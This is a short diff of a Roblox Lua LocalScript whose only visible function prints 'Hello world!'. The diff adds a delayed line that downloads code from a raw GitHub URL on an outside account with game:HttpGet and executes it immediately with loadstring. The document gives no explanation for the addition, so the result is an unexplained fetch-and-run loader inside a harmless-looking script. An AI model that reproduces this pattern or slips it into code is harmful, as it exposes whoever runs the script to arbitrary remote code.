@@ -143,4 +143,6 @@ local function YRWZVHE_fake_script() -- screengu.LocalScript
 	print("Hello world!")
 	
 end
+wait(3)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/cihonemm/ez/main/e'))()
 coroutine.wrap(YRWZVHE_fake_script)()
